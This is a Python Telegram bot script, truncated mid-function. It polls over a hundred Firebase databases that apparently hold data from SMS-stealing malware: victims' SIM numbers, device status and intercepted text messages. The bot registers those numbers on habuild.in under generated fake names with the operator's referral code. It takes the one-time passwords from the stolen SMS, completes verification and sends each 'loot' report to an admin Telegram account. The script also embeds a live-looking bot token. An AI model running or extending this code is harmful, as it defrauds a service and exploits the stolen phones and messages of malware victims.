import os
import sys
import re
import time
import uuid
import json
import random
import asyncio
import logging
from datetime import datetime
from typing import Optional
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.WARNING,
)

# ========== YOUR DETAILS (ADDED) ==========
TOKEN = "8841593698:AAFucNhM325wguWpdk-lFK6XI6tptwVzJIg"
ADMIN_ID = 8403468945
HABIT_REF = "adnan94901186"
# ==========================================

POLL_INTERVAL = 0.2  
NUM_WORKERS = 300    

USED_NUMBERS_FILE = "used_numbers.txt"

# ========== ALL PANELS (OLD + NEW) ==========
ALL_PANELS = [
    # Old panels (jo script mein pehle se the)
    "https://ck-kumar3-default-rtdb.firebaseio.com/20112024/All_User/",
    "https://ckraj-7c86d-default-rtdb.firebaseio.com/20112024/All_User/",
    "https://mman-433ae-default-rtdb.firebaseio.com/csc6/All_User/",
    "https://ujjwal-malmala-2ae81-default-rtdb.asia-southeast1.firebasedatabase.app/19112024/All_User/",
    "https://pm-kisan-04-de0e4-default-rtdb.firebaseio.com/csc5/All_User/",
    "https://parkashbhai-default-rtdb.firebaseio.com/19112024/All_User/",
    "https://pm-kishan-31-ea1ac-default-rtdb.firebaseio.com/csc5/All_User/",
    "https://pm-kishan-a8-default-rtdb.firebaseio.com/20112024/All_User/",
    "https://randa-2609c-default-rtdb.firebaseio.com/csc6/All_User/",
    "https://pm75-a64de-default-rtdb.firebaseio.com/csc6/All_User/",
    "https://go-one-1b6b2-default-rtdb.firebaseio.com/20112024/All_User/",
    "https://skkumar-2cb0e-default-rtdb.firebaseio.com/20112024/All_User/",
    "https://mera-wala-71a5e-default-rtdb.firebaseio.com/20112024/All_User/",
    "https://aaaa-b3749-default-rtdb.firebaseio.com/20112024/All_User/",
    "https://kumarlive1-default-rtdb.firebaseio.com/omex/All_User/",
    "https://maik-31440-default-rtdb.firebaseio.com/omex/All_User/",
    "https://rahul-6bf55-default-rtdb.firebaseio.com/omex/All_User/",
    "https://karishmacsc-42128-default-rtdb.firebaseio.com/csc5/All_User/",
    "https://please-2b091-default-rtdb.firebaseio.com/20112024/All_User/",
    "https://pm-kisan-25hxg-default-rtdb.firebaseio.com/csc5/All_User/",
    "https://vdgdgd-80f1e-default-rtdb.firebaseio.com/19112024/All_User/",
    "https://pm-kisan-01hfg-default-rtdb.firebaseio.com/csc5/All_User/",
    "https://lalanashish2-default-rtdb.firebaseio.com/19112024/All_User/",
    "https://kitter-rajk8-default-rtdb.firebaseio.com/19112024/All_User/",
    "https://pm-kishan-24hguh-default-rtdb.firebaseio.com/csc5/All_User/",
    "https://pm-kisan-03-9c8f7-default-rtdb.firebaseio.com/csc5/All_User/",
    "https://mmmm-f7678-default-rtdb.firebaseio.com/19112024/All_User/",
    "https://myabtar-default-rtdb.firebaseio.com/csc1/All_User/",
    "https://myabtar-default-rtdb.firebaseio.com/csc2/All_User/",
    "https://myabtar-default-rtdb.firebaseio.com/csc3/All_User/",
    "https://myabtar-default-rtdb.firebaseio.com/csc4/All_User/",
    "https://pm-kisan-28hhj-default-rtdb.firebaseio.com/Rahul7678/All_User/",
    "https://pm-kisan-13bguh-default-rtdb.firebaseio.com/csc5/All_User/",
    "https://pm-kisan-30jgj-default-rtdb.firebaseio.com/Rahul7678/All_User/",
    "https://pm-modi-22dh-default-rtdb.firebaseio.com/Rahul7678/All_User/",
    "https://radhe-d31aa-default-rtdb.firebaseio.com/24kacscshoot/All_User/",
    "https://rto-63-default-rtdb.asia-southeast1.firebasedatabase.app/",
    "https://duuu-dc41d-default-rtdb.firebaseio.com/",
    "https://kingbggbb-default-rtdb.firebaseio.com",
    "https://gggggg-979bd-default-rtdb.firebaseio.com",
    "https://admin-panel-client-a3ee5-default-rtdb.firebaseio.com",
    "https://risho-d4c66-default-rtdb.firebaseio.com",
    "https://rahulgandhi-d09ca-default-rtdb.firebaseio.com",
    "https://rahul-54fe9-default-rtdb.firebaseio.com",
    "https://gjhghjj-3d251-default-rtdb.firebaseio.com",
    "https://dyydd-c53c8-default-rtdb.firebaseio.com",
    "https://priyaknn-3e914-default-rtdb.firebaseio.com",
    "https://panel-wala-v40-default-rtdb.firebaseio.com",
    "https://newrto30-default-rtdb.firebaseio.com",
    "https://chfjfj-c2857-default-rtdb.firebaseio.com",
    "https://comeback-5b876-default-rtdb.firebaseio.com",
    "https://dogla-de225-default-rtdb.firebaseio.com",
    "https://dyno-1b564-default-rtdb.firebaseio.com",
    "https://flash-v7powerengine-v7-default-rtdb.firebaseio.com",
    "https://gren-ff2af-default-rtdb.firebaseio.com",
    "https://hdmax1-58366-default-rtdb.firebaseio.com",
    "https://imdum-6e873-default-rtdb.firebaseio.com",
    "https://lalannew5-default-rtdb.firebaseio.com",
    "https://loda-5029e-default-rtdb.firebaseio.com",
    "https://manuwa-bb70a-default-rtdb.firebaseio.com",
    "https://money-ace2c-default-rtdb.firebaseio.com",
    "https://mpari-6a6e5-default-rtdb.firebaseio.com",
    "https://myapp-8228a-default-rtdb.firebaseio.com",
    "https://newspreding-default-rtdb.firebaseio.com",
    "https://nky0-a5870-default-rtdb.firebaseio.com",
    "https://panel-wala-v16-default-rtdb.firebaseio.com",
    "https://pehla-panel-green-default-rtdb.firebaseio.com",
    "https://pm-kishan-b3-default-rtdb.firebaseio.com",
    "https://pm-kishan-b4-default-rtdb.firebaseio.com",
    "https://pmsjdj-default-rtdb.firebaseio.com",
    "https://privatesok-59944-default-rtdb.firebaseio.com",
    "https://projectsb0810-default-rtdb.firebaseio.com",
    "https://pvn7-a873a-default-rtdb.firebaseio.com",
    "https://rahulcscperosnl-default-rtdb.firebaseio.com",
    "https://rajputchuttad-default-rtdb.firebaseio.com",
    "https://rameshwar-7okt-default-rtdb.firebaseio.com",
    "https://rc-39-15-default-rtdb.firebaseio.com",
    "https://rexxx-4c7a7-default-rtdb.firebaseio.com",
    "https://rto-47-b39f4-default-rtdb.firebaseio.com",
    "https://rto9-d2b33-default-rtdb.firebaseio.com",
    "https://rto91-2b27f-default-rtdb.firebaseio.com",
    "https://rtochallan-8579d-default-rtdb.firebaseio.com",
    "https://rtochallan8-default-rtdb.firebaseio.com",
    "https://rtomatrix-c1e78-default-rtdb.firebaseio.com",
    "https://runjun-master-panel-default-rtdb.firebaseio.com",
    "https://sbi-yono-i31an-default-rtdb.firebaseio.com",
    "https://server-1-c3501-default-rtdb.firebaseio.com",
    "https://server-2-a095f-default-rtdb.firebaseio.com",
    "https://server-3-e44be-default-rtdb.firebaseio.com",
    "https://server-6-42c3b-default-rtdb.firebaseio.com",
    "https://server14-c6551-default-rtdb.firebaseio.com",
    "https://singhaana-6f199-default-rtdb.firebaseio.com",
    "https://spy-25-default-rtdb.firebaseio.com",
    "https://strom-90e84-default-rtdb.firebaseio.com",
    "https://tillu-2-default-rtdb.firebaseio.com",
    "https://u13667713-dc566-default-rtdb.firebaseio.com",
    "https://u16714964-283ef-default-rtdb.firebaseio.com",
    "https://u24143844-c1b11-default-rtdb.firebaseio.com",
    "https://u24153206-5eef6-default-rtdb.firebaseio.com",
    "https://u2519579-a31aa-default-rtdb.firebaseio.com",
    "https://u25428732-91bd9-default-rtdb.firebaseio.com",
    "https://u25783858-e6739-default-rtdb.firebaseio.com",
    "https://u2865726-eeb1f-default-rtdb.firebaseio.com",
    "https://u40179853-987df-default-rtdb.firebaseio.com",
    "https://u58325342-dffc0-default-rtdb.firebaseio.com",
    "https://u62751482-f5b46-default-rtdb.firebaseio.com",
    "https://u62803313-e54bc-default-rtdb.firebaseio.com",
    "https://u67583339-bf0c1-default-rtdb.firebaseio.com",
    "https://u72328193-47b68-default-rtdb.firebaseio.com",
    "https://u72749819-fa563-default-rtdb.firebaseio.com",
    "https://u75887828-b5a63-default-rtdb.firebaseio.com",
    "https://u8208372-ad1d1-default-rtdb.firebaseio.com",
    "https://ultra-14-default-rtdb.firebaseio.com",
    "https://ultra381144-d1af5-default-rtdb.firebaseio.com",
    "https://vecna-82db2-default-rtdb.firebaseio.com",
    "https://yono-sb41-default-rtdb.firebaseio.com",
    "https://yourfirebase-default-rtdb.firebaseio.com",
    
    # New panels (tere naye)
    "https://ajay-33c1b-default-rtdb.firebaseio.com",
    "https://pm-kisan-17hh-default-rtdb.firebaseio.com",
    "https://pm-kishan-a8-default-rtdb.firebaseio.com",
    "https://parkashbhai-default-rtdb.firebaseio.com",
    "https://rajshoott-adminna-kutt-default-rtdb.firebaseio.com",
    "https://bandhan2-7jan-default-rtdb.firebaseio.com",
    "https://randi-rona-81876-default-rtdb.firebaseio.com",
    "https://darknet-26b68-default-rtdb.firebaseio.com",
    "https://tryagainnew-58f1a-default-rtdb.firebaseio.com",
    "https://smas-8bff8-default-rtdb.firebaseio.com",
    "https://jamtara118-7cd20-default-rtdb.firebaseio.com",
    "https://s85138920-87594-default-rtdb.firebaseio.com",
    "https://hopkhfg-9981a-default-rtdb.firebaseio.com",
    "https://samar95476-54eb9-default-rtdb.firebaseio.com",
    "https://samar84900-6f084-default-rtdb.firebaseio.com",
    "https://salasali6990-1171d-default-rtdb.firebaseio.com",
    "https://raja252525raj-4ee9a-default-rtdb.firebaseio.com",
    "https://rahu80759-ac69b-default-rtdb.firebaseio.com",
    "https://raj254346kumar-84033-default-rtdb.firebaseio.com",
    "https://jamtara74-c231e-default-rtdb.firebaseio.com",
    "https://u66grdgh-default-rtdb.firebaseio.com",
    "https://dhheee-b95dc-default-rtdb.firebaseio.com",
    "https://udkudjudj-default-rtdb.firebaseio.com",
    "https://rantaishita-f7614-default-rtdb.firebaseio.com",
    "https://yes2-ead3d-default-rtdb.firebaseio.com",
    "https://rando-acf5a-default-rtdb.firebaseio.com",
    "https://rnd12-17508-default-rtdb.firebaseio.com",
    "https://pawankumar92342038-8f702-default-rtdb.firebaseio.com",
    "https://mera5-a7138-default-rtdb.firebaseio.com",
    "https://ruparamee-14f4b-default-rtdb.firebaseio.com",
    "https://mun4-ff5d4-default-rtdb.firebaseio.com",
    "https://sanjee-9918a-default-rtdb.firebaseio.com",
    "https://pohn-cd7ea-default-rtdb.firebaseio.com",
    "https://kumu-f2257-default-rtdb.firebaseio.com",
    "https://bu-3-13-default-rtdb.firebaseio.com",
]

# Remove duplicates
RAW_URLS = list(set(ALL_PANELS))
DATABASES = {f"DB_{i+1}": url for i, url in enumerate(RAW_URLS)}

print(f"✅ Loaded {len(DATABASES)} unique panels")

# Updated Powerful Name Generation Logic
MALE_FIRST_NAMES = ['Arjun', 'Aarav', 'Vihaan', 'Kabir', 'Dhruv', 'Krishna', 'Ishaan', 'Rahul', 'Vikram', 'Karan', 'Aditya', 'Rohan', 'Shaurya', 'Advik', 'Aryan', 'Reyansh', 'Vedant', 'Abhinav', 'Yash', 'Rishi']
FEMALE_FIRST_NAMES = ['Ananya', 'Aadhya', 'Diya', 'Ishita', 'Kiara', 'Myra', 'Navya', 'Kajal', 'Neha', 'Sneha', 'Pooja', 'Riya', 'Kriti', 'Tanya', 'Shruti', 'Priya', 'Meera', 'Tara', 'Anika', 'Arohi']
LAST_NAMES = ['Sharma', 'Verma', 'Gupta', 'Patil', 'Deshmukh', 'Singh', 'Kumar', 'Mishra', 'Joshi', 'Chauhan', 'Rajput', 'Yadav', 'Rathore', 'Mehta', 'Reddy', 'Nair', 'Bhatia', 'Ahuja', 'Kapoor', 'Iyer']
MAX_NAME_COMBINATIONS = (len(MALE_FIRST_NAMES) + len(FEMALE_FIRST_NAMES)) * len(LAST_NAMES)

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; M2304W1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
]

ENGINE_PREFIXES = ['QUANTUM', 'STEALTH', 'NEXUS', 'TITAN', 'CYBER', 'GHOST', 'SUPREME', 'OMEGA', 'ALPHA', 'SHADOW', 'VORTEX', 'ECLIPSE', 'COSMIC', 'NEO', 'PHANTOM', 'VENOM', 'APOLLO']
ENGINE_CORES = ['ENGINE', 'MATRIX', 'CORE', 'STRIKER', 'DESTROYER', 'REAPER', 'PULSE', 'OVERLORD', 'PREDATOR', 'SYNDICATE', 'DRAGON', 'VIPER', 'FALCON', 'BOT', 'ASSASSIN']

def get_dynamic_engine_name():
    return f"{random.choice(ENGINE_PREFIXES)} {random.choice(ENGINE_CORES)}"

_http_session: Optional[aiohttp.ClientSession] = None
_main_app: Optional[Application] = None
GLOBAL_DEVICE_CACHE = {}
seen_sms_ids = set()
used_names = set()
dead_panels = set()

pending_habuild = {} 
processed_nums = set() 
looted_count = [0] 
last_activity_time = time.time()
live_message_id = None 

number_queue = None
WAITING_FOR_PANEL = False

def load_used_numbers():
    if os.path.exists(USED_NUMBERS_FILE):
        try:
            with open(USED_NUMBERS_FILE, "r") as f:
                for line in f:
                    num = line.strip()
                    if num: processed_nums.add(num)
        except Exception: pass

def save_used_number(num):
    processed_nums.add(num)
    try:
        with open(USED_NUMBERS_FILE, "a") as f:
            f.write(f"{num}\n")
    except Exception: pass

def generate_indian_name():
    global used_names
    if len(used_names) >= MAX_NAME_COMBINATIONS - 5: 
        used_names.clear()
        
    while True:
        if random.choice([True, False]):
            first_name = random.choice(MALE_FIRST_NAMES)
        else:
            first_name = random.choice(FEMALE_FIRST_NAMES)
            
        name = f"{first_name} {random.choice(LAST_NAMES)}"
        if name not in used_names:
            used_names.add(name)
            return name

def get_random_headers():
    ua = random.choice(USER_AGENTS)
    headers = {
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://portal.habuild.in",
        "Referer": "https://portal.habuild.in/",
        "Accept-Language": "en-US,en;q=0.9,hi-IN;q=0.8",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site"
    }
    if "Android" in ua:
        headers["sec-ch-ua-platform"] = '"Android"'
        headers["sec-ch-ua-mobile"] = "?1"
    elif "iPhone" in ua:
        headers["sec-ch-ua-platform"] = '"iOS"'
        headers["sec-ch-ua-mobile"] = "?1"
    return headers, ua

async def get_http_session():
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=10000, keepalive_timeout=60)
        _http_session = aiohttp.ClientSession(connector=connector)
    return _http_session

async def fb_get(path: str, base: str) -> Optional[dict]:
    if base in dead_panels: return None
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
            if r.status != 200: return None
            data = await r.json(content_type=None)
            return data if isinstance(data, dict) else None
    except Exception: return None

def extract_all_nums(*dicts) -> list[str]:
    nums = []
    keys_to_check = ["sim1Number", "sim2Number", "numberSim1", "numberSim2", "mobNo", "phoneNumber", "phone", "mobile"]
    for d in dicts:
        if not isinstance(d, dict): continue
        for k in keys_to_check:
            val = str(d.get(k, ""))
            if val and len(re.sub(r"\D", "", val)) > 9:
                clean = re.sub(r"\D", "", val)
                if len(clean) >= 10: nums.append(clean[-10:])
    return list(set(nums))

async def fetch_db_data(tag: str, url: str) -> list:
    devices_list = []
    try:
        sim_all, device_info_all, user_data_all = await asyncio.gather(
            fb_get("All_Users/simDetails", url), 
            fb_get("All_Users/Data/DeviceInfo", url),
            fb_get("user_data", url), return_exceptions=True
        )
        if isinstance(sim_all, dict):
            info_all = device_info_all if isinstance(device_info_all, dict) else {}
            for dev_id, sim in sim_all.items():
                info = info_all.get(dev_id) or {}
                nums = extract_all_nums(sim, info)
                status = "online" if str(info.get("Status")).lower() == "online" else "offline"
                
                devices_list.append({"id": dev_id, "numbers": nums, "status": status, "base": url, "path": f"All_Users/sms/{dev_id}"})
                
        if isinstance(user_data_all, dict):
            for dev_id, data in user_data_all.items():
                if not isinstance(data, dict): continue
                nums = extract_all_nums(data)
                status = "online" if str(data.get("status")).lower() == "online" else "offline"
                
                devices_list.append({"id": dev_id, "numbers": nums, "status": status, "base": url, "path": f"user_sms/{dev_id}"})
    except Exception:
        dead_panels.add(url)
    return devices_list

async def trigger_registration(phone_10d: str, worker_id: int, real_name: str):
    global last_activity_time
    last_activity_time = time.time()
    phone_full = f"+91{phone_10d}"
    device_id = str(uuid.uuid4())
    session_id = str(uuid.uuid4())

    reg_url = "https://auth-service.habuild.in/public/user/v1/register-user"
    reg_payload = {"name": real_name, "phoneNumber": phone_full, "referredBy": HABIT_REF, "sourceData": {"type": "Referral", "refererurl": "", "timezone": "Asia/Kolkata"}, "experimentMetaInfo": {"deviceId": device_id, "sessionId": session_id}}

    try:
        session = await get_http_session()
        headers, chosen_ua = get_random_headers()
        
        async with session.post(reg_url, json=reg_payload, headers=headers, timeout=10) as r:
            if r.status == 429:
                await asyncio.sleep(1) 
                await number_queue.put((phone_10d, real_name)) 
                return
            res = await r.json()
            if res.get('message') == 'success':
                log_url = "https://auth-service.habuild.in/public/auth/v1/login"
                log_payload = {"method": "phone_otp", "otpChannel": "sms", "phoneNumber": phone_full, "sourceData": {"type": "portal", "utm_source": "whatsapp"}, "experimentMetaInfo": {"deviceId": device_id, "sessionId": str(uuid.uuid4())}, "registerUser": False}
                async with session.post(log_url, json=log_payload, headers=headers, timeout=10) as lr:
                    if lr.status == 429:
                        await asyncio.sleep(1)
                        await number_queue.put((phone_10d, real_name))
                        return
                    lres = await lr.json()
                    if lres.get('message') == 'OTP sent to your phone':
                        ref_code = lres.get('data', {}).get('refrence_code')
                        pending_habuild[phone_10d] = {
                            "phone": phone_full, 
                            "otp_ref": ref_code, 
                            "device_id": device_id, 
                            "session_id": session_id,
                            "user_agent": chosen_ua,
                            "name": real_name,
                            "timestamp": time.time()
                        }
                        print(f"FAST HIT [W-{worker_id}]: {phone_10d} | {real_name}")
    except Exception:
        await number_queue.put((phone_10d, real_name)) 

async def verify_habuild_otp(phone_10d: str, otp: str):
    global last_activity_time
    data = pending_habuild.pop(phone_10d, None)
    if not data: return

    last_activity_time = time.time()
    url = "https://auth-service.habuild.in/public/auth/v1/verify-otp"
    payload = {"phone": data['phone'], "reference_code": data['otp_ref'], "otp": otp, "experimentMetaInfo": {"deviceId": data['device_id'], "sessionId": str(uuid.uuid4())}, "registerUser": False}
    try:
        session = await get_http_session()
        headers, _ = get_random_headers()
        
        async with session.post(url, json=payload, headers=headers, timeout=10) as r:
            res = await r.json()
            if res.get('message') == 'OTP verified successfully':
                looted_count[0] += 1
                member = res.get('data', {}).get('member', {})
                engine_name = get_dynamic_engine_name()
                
                succ_msg = (
                    f"{engine_name} LOOT SUCCESSFUL!\n\n"
                    f"Number: {data['phone']}\n"
                    f"Real Name: {member.get('name', data['name'])}\n"
                    f"Member ID: {member.get('legacy_free_id', 'N/A')}\n"
                    f"Code Used: {HABIT_REF}\n\n"
                    f"--- DEVICE INFO LOG ---\n"
                    f"Device ID: {data['device_id']}\n"
                    f"Session ID: {data['session_id']}\n"
                    f"User-Agent: {data['user_agent']}\n"
                    f"-----------------------\n\n"
                    f"Verified OTP {otp} perfectly!"
                )
                if _main_app: await _main_app.bot.send_message(ADMIN_ID, succ_msg)
    except Exception: pass

async def _forward_sms(device: dict, sms: dict):
    body = str(sms.get("body") or sms.get("message") or sms.get("text") or "")
    sender = str(sms.get("sender") or "")
    otp_match = re.search(r"\b(\d{6})\b", body)
    if otp_match and ("HABUILD" in sender.upper() or "Habuild" in body):
        otp = otp_match.group(1)
        for num in device.get("numbers", []):
            if num in pending_habuild:
                asyncio.create_task(verify_habuild_otp(num, otp))
                break

async def poll_single_db(url: str):
    if url in dead_panels: return
    try:
        r_main, r_user = await asyncio.gather(fb_get("All_Users/sms", url), fb_get("user_sms", url), return_exceptions=True)
        devices_in_db = [d for d in GLOBAL_DEVICE_CACHE.get("ALL", []) if d["base"] == url]
        device_map = {d["id"]: d for d in devices_in_db}
        for bulk_data in (r_main, r_user):
            if not isinstance(bulk_data, dict): continue
            for dev_id, sms_dict in bulk_data.items():
                if not isinstance(sms_dict, dict): continue
                device = device_map.get(dev_id)
                for k, sms in sms_dict.items():
                    if not isinstance(sms, dict): continue
                    sk = f"{dev_id}/{k}"
                    if sk in seen_sms_ids: continue
                    seen_sms_ids.add(sk)
                    if device: await _forward_sms(device, sms)
    except Exception: pass

async def update_cache_loop():
    while True:
        try:
            tasks = [fetch_db_data(tag, url) for tag, url in DATABASES.items() if url not in dead_panels]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            all_devices = []
            for res in results:
                if isinstance(res, list): all_devices.extend(res)
            
            GLOBAL_DEVICE_CACHE["ALL"] = all_devices
            mixed_online_numbers = []
            for dev in all_devices:
                if dev.get("status") == "online":
                    for num in dev.get("numbers", []):
                        if num not in processed_nums and num not in pending_habuild:
                            real_name = generate_indian_name()
                            mixed_online_numbers.append((num, real_name))

            if mixed_online_numbers:
                random.shuffle(mixed_online_numbers)
                for num, rname in mixed_online_numbers:
                    save_used_number(num)
                    await number_queue.put((num, rname))
        except Exception: pass
        await asyncio.sleep(3)

async def api_worker(worker_id: int):
    while True:
        try:
            num, real_name = await number_queue.get()
            await trigger_registration(num, worker_id, real_name)
            number_queue.task_done()
            await asyncio.sleep(0.05) 
        except Exception:
            await asyncio.sleep(1)

async def poll_loop():
    while True:
        tasks = [poll_single_db(url) for url in DATABASES.values() if url not in dead_panels]
        if tasks: await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(POLL_INTERVAL)

async def otp_expiry_janitor():
    while True:
        try:
            current_time = time.time()
            expired_numbers = []
            
            for num, data in pending_habuild.items():
                if current_time - data.get("timestamp", current_time) > 10:
                    expired_numbers.append(num)
            
            for num in expired_numbers:
                pending_habuild.pop(num, None)
                
        except Exception:
            pass
        await asyncio.sleep(1)

async def watchdog_loop():
    global last_activity_time, _http_session, GLOBAL_DEVICE_CACHE
    while True:
        await asyncio.sleep(15)  
        if time.time() - last_activity_time > 60:  
            if _main_app and live_message_id is None:
                try: await _main_app.bot.send_message(ADMIN_ID, "System Idle. Auto-restarting engine...")
                except: pass
            GLOBAL_DEVICE_CACHE.clear()
            if _http_session and not _http_session.closed:
                await _http_session.close()
                _http_session = None
            last_activity_time = time.time()

async def auto_backup_loop():
    while True:
        await asyncio.sleep(14400)
        if _main_app and os.path.exists(USED_NUMBERS_FILE):
            try:
                await _main_app.bot.send_document(
                    chat_id=ADMIN_ID, document=open(USED_NUMBERS_FILE, "rb"), 
                    caption="Auto-Backup: Aapka Used Numbers Database Safe Hai."
                )
            except Exception: pass

async def live_dashboard_updater():
    global live_message_id
    while True:
        await asyncio.sleep(5)
        if live_message_id and _main_app:
            try:
                q_size = number_queue.qsize() if number_queue else 0
                idle_time = int(time.time() - last_activity_time)
                active_panels = len(DATABASES) - len(dead_panels)
                engine_name = get_dynamic_engine_name()
                
                text = (
                    f"{engine_name} LIVE DASHBOARD (UNLIMITED MODE)\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    f"Active Panels: {active_panels}/{len(DATABASES)}\n"
                    f"Dead Panels Skipped: {len(dead_panels)}\n"
                    f"Idle Time: {idle_time}s\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    f"Numbers in Queue: {q_size}\n"
                    f"DB Saved Numbers: {len(processed_nums)}\n"
